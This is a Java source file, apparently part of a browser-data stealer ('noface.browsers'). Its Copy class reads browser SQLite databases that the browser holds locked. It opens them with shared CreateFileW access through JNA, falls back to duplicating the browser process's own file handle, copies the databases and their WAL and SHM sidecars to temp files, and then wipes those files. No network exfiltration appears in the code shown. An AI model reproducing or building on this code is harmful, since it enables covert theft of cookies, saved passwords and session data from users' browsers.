package noface.browsers;

import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public final class Copy {

    public static byte[] bytes(Path source) {
        if (source == null || !Files.isRegularFile(source)) return null;

        byte[] shared = readShared(source);
        if (shared != null) return shared;

        try {
            return Files.readAllBytes(source);
        } catch (IOException ignored) {}

        byte[] streamed = viaStream(source);
        if (streamed != null) return streamed;

        String exe = Paths.procFor(source);
        if (exe != null) return Dup.grab(source, exe);
        return null;
    }

    public static Path snap(Path source) {
        if (source == null || !Files.isRegularFile(source)) return null;
        try {
            Path temp = Files.createTempFile("nf_", ".db");
            byte[] main = bytes(source);
            if (main == null || main.length == 0) {
                wipe(temp);
                return null;
            }
            Files.write(temp, main);
            sidecar(source.resolveSibling(source.getFileName() + "-wal"),
                    temp.resolveSibling(temp.getFileName() + "-wal"));
            sidecar(source.resolveSibling(source.getFileName() + "-shm"),
                    temp.resolveSibling(temp.getFileName() + "-shm"));
            return temp;
        } catch (IOException e) {
            return null;
        }
    }

    public static void wipe(Path temp) {
        if (temp == null) return;
        try {
            Files.deleteIfExists(temp);
            Files.deleteIfExists(temp.resolveSibling(temp.getFileName() + "-wal"));
            Files.deleteIfExists(temp.resolveSibling(temp.getFileName() + "-shm"));
        } catch (IOException ignored) {}
    }

    private static void sidecar(Path src, Path dst) {
        if (!Files.isRegularFile(src)) return;
        byte[] data = readShared(src);
        if (data == null) {
            try { Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING); } catch (IOException ignored) {}
            return;
        }
        try { Files.write(dst, data); } catch (IOException ignored) {}
    }

    private static byte[] readShared(Path source) {
        try {
            com.sun.jna.Function fn = com.sun.jna.Function.getFunction("kernel32", "CreateFileW", com.sun.jna.Function.ALT_CONVENTION);
            WinNT.HANDLE h = (WinNT.HANDLE) fn.invoke(WinNT.HANDLE.class, new Object[]{
                    new com.sun.jna.WString(source.toAbsolutePath().toString()),
                    0x80000000, 0x00000007, null, 3, 0x00000080, null
            });
            if (h == null || WinNT.INVALID_HANDLE_VALUE.equals(h)) return null;
            try {
                long size = Files.size(source);
                if (size <= 0 || size > 512L * 1024 * 1024) return null;
                byte[] data = new byte[(int) size];
                IntByReference read = new IntByReference();
                if (!Kernel32.INSTANCE.ReadFile(h, data, data.length, read, null) || read.getValue() <= 0) return null;
                return trim(data, read.getValue());
            } finally {
                Kernel32.INSTANCE.CloseHandle(h);
            }
        } catch (Throwable t) {
            return null;
        }
    }

    private static byte[] trim(byte[] data, int len) {
        if (len == data.length) return data;
        byte[] out = new byte[len];
        System.arraycopy(data, 0, out, 0, len);
        return out;
    }

    private static byte[] viaStream(Path source) {
        try (InputStream in = Files.newInputStream(source);
             ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            in.transferTo(out);
            return out.toByteArray();
        } catch (IOException e) {
            return null;
        }
    }

    private Copy() {}
}
